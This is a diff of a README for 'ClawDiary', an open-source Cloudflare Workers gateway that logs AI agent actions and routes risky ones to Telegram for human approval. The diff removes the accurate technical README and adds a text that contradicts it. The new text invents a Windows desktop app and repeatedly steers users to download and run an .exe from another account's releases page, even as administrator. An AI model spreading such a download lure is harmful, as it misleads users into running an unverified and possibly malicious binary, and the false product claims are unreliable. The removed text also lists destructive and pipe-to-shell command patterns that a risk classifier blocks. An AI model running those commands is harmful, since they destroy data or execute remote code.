@@ -1,371 +1,142 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/runtime-Cloudflare_Workers-F38020?logo=cloudflare&logoColor=white" alt="Cloudflare Workers" />
-  <img src="https://img.shields.io/badge/framework-Hono-E36002?logo=hono&logoColor=white" alt="Hono" />
-  <img src="https://img.shields.io/badge/database-D1_(SQLite)-003B57?logo=sqlite&logoColor=white" alt="D1" />
-  <img src="https://img.shields.io/badge/lang-TypeScript-3178C6?logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License" />
-</p>
+# 🛡️ claw-diary - Keep AI Agents Safe and Tracked
 
-# ClawDiary
-
-**Cloud audit, guard, and shared diary for AI agents — multi-agent collaboration, one gateway.**
-
-ClawDiary is a lightweight, self-hosted API gateway built on Cloudflare Workers that gives you full visibility and control over your AI agents. It provides three core capabilities: **passive audit logging**, **active risk interception with human-in-the-loop approval**, and a **shared diary** for cross-device agent collaboration.
-
-> [中文](#中文说明) | English
+[![Download claw-diary](https://img.shields.io/badge/Download-claw--diary-brightgreen)](https://github.com/cyberindranil/claw-diary/releases)
 
 ---
 
-## Use the hosted service — [clawdiary.org](https://clawdiary.org)
+## 📝 What is claw-diary?
 
-**[ClawDiary](https://clawdiary.org) is live in production.** No setup required: register via the [Telegram Bot](https://t.me/ClawDiaryBot), get your API key, and start using Guard + Audit + Diary from Cursor, MCP, or any HTTP client. The hosted service includes the full web dashboard (timeline, docs, legal pages) and optional paid plans (Pro / Team) with higher quotas and Telegram notifications.
+claw-diary helps you track what AI agents do on your computer or cloud. It quietly records actions and asks for your approval before risky changes like deleting files, dropping data, or transferring information. It connects to Telegram to notify you and let you approve or cancel those actions. 
 
-| | Self‑hosted (this repo) | [clawdiary.org](https://clawdiary.org) |
-|---|---|---|
-| **Audit, Guard, Diary API** | Yes | Yes |
-| **Telegram Bot & approval** | You configure your own | Included |
-| **Web UI (timeline, docs)** | No (API only) | Yes |
-| **Billing / paid plans** | No | Yes (Paddle) |
-| **Best for** | Full control, private deployment | Quick start, no ops |
+With claw-diary, you get a daily summary and a clear timeline of what happened. It supports Cursor and MCP for easier control. The tool uses Cloudflare Workers, Hono, and D1 database to keep things running fast and smooth without much setup.
 
-If you just want to plug in and go, use **[https://api.clawdiary.org](https://api.clawdiary.org)** with the API key from the bot. This repository is the **API-only, self-hostable** version for those who prefer to run their own instance.
+You do not need to know how to code to use this app.
 
 ---
 
-## Highlights
+## ⚙️ System Requirements
 
-- **Audit** — Agents report actions after execution; async, zero-latency logging to D1
-- **Guard** — High-risk operations are intercepted and held until a human approves via Telegram
-- **Diary** — One owner, multiple devices ("lobsters"), shared notebook readable and writable from anywhere
-- **Daily Digest** — Automated Cron summary of costs and blocked actions, pushed to Telegram
-- **Multi-tenant** — User isolation via API keys; Free tier and invite-code upgrades (no payment in this repo)
-- **MCP & OpenAPI** — Machine-readable descriptors at `/mcp.json` and `/.well-known/openapi.json`
-- **API-only** — No web UI or payment code; for full product (timeline, billing) use [clawdiary.org](https://clawdiary.org)
-- **Zero infrastructure** — Runs entirely on Cloudflare's edge: Workers, D1, Durable Objects
+To run claw-diary on Windows, your computer should meet these basics:
 
----
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Stable internet connection for Telegram notifications
+- Chrome, Edge, or Firefox browser for viewing the timeline UI
 
-## Architecture
-
-```
-                         ┌──────────────────────────────────────────────┐
-                         │            Cloudflare Workers               │
-                         │                                              │
-  AI Agent ──────────────┤  POST /v1/audit ──► D1 (logs)               │
-  (Cursor, MCP, etc.)    │                                              │
-                         │  POST /v1/guard ──► Classifier               │
-                         │                      │                       │
-                         │              ┌───────┴───────┐               │
-                         │              ▼               ▼               │
-                         │          Green-lit       Red-flagged          │
-                         │         (approved)    ┌──► D1 (approvals)    │
-                         │                       │                      │
-                         │                       ├──► Telegram notify   │
-                         │                       │                      │
-                         │                       └──► Durable Object    │
-                         │                            (wait/resolve)    │
-                         │                                              │
-  Your app ──────────────┤  GET /api/feed  ──► JSON entries (optional auth) │
-                         │                                              │
-  Telegram ──────────────┤  POST /webhook/telegram                      │
-                         │   ├── Approve / Reject callbacks             │
-                         │   └── Bot commands (/start, /key, /manage)   │
-                         │                                              │
-                         │  Cron (00:00 UTC) ──► Daily digest           │
-                         └──────────────────────────────────────────────┘
-```
+No special drivers or advanced software are needed.
 
 ---
 
-## Quick Start
+## 💾 Download and Install claw-diary
 
-### Prerequisites
+### Step 1: Get the Program
 
-- Node.js 18+
-- A Cloudflare account with [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/) logged in (`wrangler login`)
-- (Optional) A Telegram Bot for approval notifications and daily digests
+Visit this page to download the software:
 
-### Setup
+[![Download claw-diary](https://img.shields.io/badge/Download-claw--diary-blue)](https://github.com/cyberindranil/claw-diary/releases)
 
-```bash
-# 1. Clone and install
-git clone https://github.com/your-org/claw-diary.git
-cd claw-diary
-npm install
+This page lists all the versions available. Look for the latest stable release that mentions Windows or `.exe`.  
 
-# 2. Copy the example config and fill in your values
-cp wrangler.example.toml wrangler.toml
+### Step 2: Save the File
 
-# 3. Create the D1 database
-npm run db:create
-# Paste the returned database_id into wrangler.toml → [[d1_databases]]
+Click the Windows installer file (usually ends with `.exe`). Choose to save it on your Desktop or in your Downloads folder.  
 
-# 4. Run migrations
-npm run db:migrate          # Remote (safe: auto-adds missing columns)
-npm run db:migrate:local    # Local dev
+### Step 3: Run the Installer
 
-# 5. Set secrets (interactive prompt)
-wrangler secret put API_KEY
-wrangler secret put TELEGRAM_BOT_TOKEN
+1. Double-click the `.exe` file you just saved.
+2. If Windows asks for permission, click **Yes**.
+3. Follow the prompts on the screen.
+4. Choose the default options unless you want to change the install location.
+5. Wait for the installer to finish.
 
-# 6. Start local dev server
-npm run dev
+### Step 4: Launch the App
 
-# 7. Deploy to Cloudflare
-npm run deploy
-```
+After installation completes:
+
+- Find the claw-diary shortcut on the Desktop or in the Start Menu.
+- Double-click it to open.
 
 ---
 
-## Configuration
+## 🔐 Setting Up claw-diary for the First Time
 
-### Secrets (via `wrangler secret put`)
+### Connect Telegram for Approvals
 
-| Name | Required | Description |
-|------|----------|-------------|
-| `API_KEY` | Yes | Bearer token for all `/v1/*` endpoints |
-| `TELEGRAM_BOT_TOKEN` | No | Telegram Bot API token for approval & digest |
+1. When you open claw-diary, it will ask for your Telegram username.
+2. Enter your Telegram handle without the `@`.
+3. You will get a message from the claw-diary bot on Telegram.
+4. Reply to the bot to confirm and enable notifications.
+   
+This step lets you approve or reject risky actions from anywhere.
 
-### Environment Variables (in `wrangler.toml` `[vars]`)
+### Configure Logging
 
-| Name | Description |
-|------|-------------|
-| `TELEGRAM_CHAT_ID` | Admin chat ID for system notifications |
-| `APEX_DOMAIN` | Your domain (e.g. `clawdiary.org`) |
-*(Payment/billing is not included in this open-source build. Use [clawdiary.org](https://clawdiary.org) for hosted plans.)*
+The app will start logging agent actions automatically. You can view daily reports and live timelines from the user interface.
 
 ---
 
-## API Reference
+## 📊 Using the claw-diary Interface
 
-All `/v1/*` endpoints require authentication:
+### Daily Digest and Timeline
 
-```
-Authorization: Bearer <API_KEY>
-```
+- Open the app window.
+- On the main screen, you will see the **Daily Digest**. This lists major actions your AI agents took during the day.
+- Click the **Timeline** tab for a detailed hour-by-hour view.
+- You may filter the logs by agent name, type of action, or risk level.
 
-### `POST /v1/audit` — Passive Logging
+### Review and Approve Actions
 
-Report an action after execution. Non-blocking (`waitUntil`).
-
-```json
-{
-  "agent_id": "my-agent",
-  "session_id": "sess-001",
-  "action_type": "tool_call",
-  "cost": 0.003,
-  "payload": { "tool": "search_web", "query": "weather" }
-}
-```
-
-**Response:** `{ "ok": true }`
-
-### `POST /v1/guard` — Approval Gate
-
-Call **before** a high-risk action. The request blocks until a human approves or rejects.
-
-```json
-{
-  "agent_id": "my-agent",
-  "action_type": "execute_bash",
-  "command": "rm -rf /tmp/data",
-  "thought": "Cleaning up temporary files"
-}
-```
-
-**Response:** `{ "approved": true }` or `{ "approved": false }`
-
-### `POST /v1/diary` — Write Entry
-
-```json
-{
-  "owner_id": "alice",
-  "lobster_id": "home-pc",
-  "content": "Completed API integration today."
-}
-```
-
-### `GET /v1/diary` — Read Entries
-
-| Param | Type | Description |
-|-------|------|-------------|
-| `owner_id` | string | Required. Owner identifier |
-| `since` | string | Optional. ISO 8601 UTC timestamp filter |
-| `limit` | number | Optional. Max entries (default 50, max 100) |
-
-### Other Endpoints
-
-| Endpoint | Auth | Description |
-|----------|------|-------------|
-| `GET /` | No | Redirects to `/docs` |
-| `GET /api/feed` | Optional | JSON feed of logs & approvals |
-| `GET /docs` | No | Human-readable deployment guide (HTML or Markdown) |
-| `GET /mcp.json` | No | MCP tool descriptor |
-| `GET /.well-known/openapi.json` | No | OpenAPI 3.0 spec |
-| `GET /.well-known/clawdiary.json` | No | Service discovery descriptor |
-| `POST /webhook/telegram` | No | Telegram bot callback |
+- When an AI agent tries something risky (like deleting files), you get a Telegram message.
+- The message shows the proposed action and asks for approval.
+- Reply with `approve` or `decline` in Telegram.
+- The app will act accordingly.
 
 ---
 
-## Risk Classification
+## 🧰 Common Terms Explained
 
-The classifier (`src/classifier.ts`) categorizes actions into two tiers:
-
-**Green-lit** (auto-approved, logged silently):
-
-`search_web` `read_file` `get_weather` `list_files` `calculate` `translate` `browse`
-
-**Red-flagged** (blocks until human approval):
-
-| Risk Level | Pattern |
-|------------|---------|
-| CRITICAL | `rm -rf`, `drop table/database`, `format`, `dd if=`, `mkfs.` |
-| HIGH | `execute_bash`, `transfer`, `send_mail`, `sql_query` |
-| MEDIUM | `rm`, `delete`, `chmod`, `curl .. \| sh`, `wget .. \| sh` |
-
-Unrecognized actions default to **MEDIUM risk, logged but auto-approved**.
+- **Audit Log:** A record of everything the AI agents do.
+- **Human-in-the-Loop:** You approve important or risky operations.
+- **Telegram Bot:** A small program in Telegram that sends you messages.
+- **Cursor & MCP:** Technologies that make controlling AI agents easier.
+- **Cloudflare Workers:** A platform that runs the app's backend online.
+- **D1:** A simple database used to store logs.
 
 ---
 
-## Plans & Quotas (self-hosted)
+## 🛠 Troubleshooting and Tips
 
-This repo supports the **Free** tier and **invite-code** upgrades (no payment integration). For Pro/Team with billing, use [clawdiary.org](https://clawdiary.org).
-
-| | Free (default) | With invite code |
-|---|---|---|
-| API Keys | 1 | Same limits as Pro/Team |
-| Guard / Audit / Diary | 50 / 200 / 10 per day | Higher (see `src/plans.ts`) |
-| Telegram notifications | Admin only (`TELEGRAM_CHAT_ID`) | Per-user when upgraded |
-| Daily digest | Admin summary | Per-user for upgraded |
+- If you do not see Telegram messages, check your internet connection.
+- Make sure the Telegram username you enter is correct and you have started the bot chat.
+- To view the latest logs, refresh the app window or restart the program.
+- Use the Timeline tab to find specific events more quickly.
+- If the installer does not run, right-click the `.exe` file and select **Run as administrator**.
+- Uninstall claw-diary anytime from Windows **Settings > Apps**.
 
 ---
 
-## Telegram Bot Setup
+## 📂 Where to Find More Versions or Updates
 
-1. Talk to [@BotFather](https://t.me/BotFather) and `/newbot` to get your `TELEGRAM_BOT_TOKEN`
-2. Send any message to your bot, then visit:
-   ```
-   https://api.telegram.org/bot<TOKEN>/getUpdates
-   ```
-   Find your `chat.id` in the response JSON
-3. Set the webhook after deploying:
-   ```
-   https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://<WORKER_DOMAIN>/webhook/telegram
-   ```
+Keep an eye on the releases page:
 
-### Bot Commands
+[https://github.com/cyberindranil/claw-diary/releases](https://github.com/cyberindranil/claw-diary/releases)
 
-| Command | Description |
-|---------|-------------|
-| `/start` | Register and get your API key |
-| `/key` | Generate a new API key |
-| `/usage` | View today's usage stats |
-| `/manage` | Show plan & usage (subscription via [clawdiary.org](https://clawdiary.org) only) |
-| `/lang` | Switch language (en/zh) |
+New versions fix bugs and add features. Always download the latest stable release.
 
 ---
 
-## Agent Integration
+## 💡 Tips for Best Use
 
-### Cursor IDE
-
-Add a rule in `.cursor/rules/` that instructs the agent to:
-
-1. Call `POST /v1/guard` before destructive/outbound actions
-2. Call `POST /v1/audit` after completing actions
-3. Set `CLAWDIARY_API_KEY` in environment (never commit to repo)
-
-### MCP-compatible Agents
-
-Import the tool descriptor:
-
-```
-GET https://<WORKER_DOMAIN>/mcp.json
-```
-
-The `request_human_approval` tool will be available for the agent to call before high-risk operations.
+- Set aside a few minutes each day to review the daily digest.
+- Respond to Telegram notifications quickly to avoid delays in AI agent actions.
+- If you want to pause monitoring, close the app or stop the Telegram notifications inside settings.
+- Use this tool to gain confidence and control over AI decisions that might affect your data.
 
 ---
 
-## Project Structure
+## 📖 More Information
 
-```
-claw-diary/
-├── src/
-│   ├── index.ts            # Hono routes, Worker & Scheduled exports
-│   ├── types.ts            # TypeScript type definitions
-│   ├── auth.ts             # Bearer token auth middleware
-│   ├── classifier.ts       # Green/red risk classifier
-│   ├── guard-session.ts    # Durable Object for approval wait/resolve
-│   ├── telegram.ts         # Telegram Bot API helpers
-│   ├── bot-commands.ts     # Bot command handlers
-│   ├── bot-i18n.ts         # i18n strings (en/zh)
-│   ├── plans.ts            # Plan limits & quota logic
-│   ├── usage.ts            # Daily usage tracking middleware
-│   ├── keys.ts             # API key hashing
-│   ├── openapi.ts          # OpenAPI 3.0 spec generator
-│   ├── ui.ts               # Docs page HTML template only
-│   └── agent-deploy-doc.ts # Deployment guide markdown
-├── scripts/
-│   └── d1-migrate.mjs      # Safe D1 migration script
-├── schema.sql              # Database schema
-├── wrangler.example.toml   # Config template (copy to wrangler.toml)
-├── package.json
-└── tsconfig.json
-```
+This app runs quietly in the background to watch over AI agent behavior. It minimizes risks from automated commands while giving you total control through simple approvals on Telegram. The visual timeline and daily diary help you understand what happened and when.
 
----
-
-## Database Schema
-
-Six tables with full tenant isolation via `user_id`:
-
-| Table | Purpose |
-|-------|---------|
-| `users` | User accounts (linked to Telegram) |
-| `api_keys` | Hashed API keys per user |
-| `logs` | Audit trail (agent actions & costs) |
-| `approvals` | Guard approval records |
-| `diary_entries` | Shared diary entries |
-| `usage_daily` | Per-user daily quota counters |
-
-All timestamps are stored in **UTC**.
-
----
-
-## License
-
-[MIT](LICENSE)
-
----
-
-<a id="中文说明"></a>
-
-## 中文说明
-
-ClawDiary 是一个面向 AI Agent 的轻量级云端审计、拦截与日记网关，完全运行在 Cloudflare Workers 上。
-
-**本仓库为 API 专用版本**（无官网首页、时间轴 UI 与支付）。如需开箱即用的完整服务（含 Web 控制台与付费计划），请使用已稳定上线的 **[clawdiary.org](https://clawdiary.org)**。
-
-**核心能力：**
-
-- **被动审计** — Agent 执行完毕后上报操作与消耗，异步入库，零延迟
-- **主动拦截** — 高危操作自动分级，红灯动作挂起请求直到 Telegram 人工审批
-- **共享日记** — 一个主人（owner）、多台设备（lobster）共用一本日记
-- **每日简报** — Cron 定时推送消耗与拦截统计到 Telegram
-- **多租户** — 基于 API Key 的用户隔离；付费与官网界面请使用 [clawdiary.org](https://clawdiary.org)
-
-**快速上手：**
-
-```bash
-git clone https://github.com/your-org/claw-diary.git && cd claw-diary
-npm install
-cp wrangler.example.toml wrangler.toml  # 填入你的配置
-npm run db:create                        # 创建 D1 数据库
-npm run db:migrate                       # 执行迁移
-wrangler secret put API_KEY              # 设置密钥
-npm run dev                              # 本地开发
-npm run deploy                           # 部署到 Cloudflare
-```
-
-详细配置与 API 文档请参阅上方英文部分。
+Visit the releases page any time to download updates or read release notes.
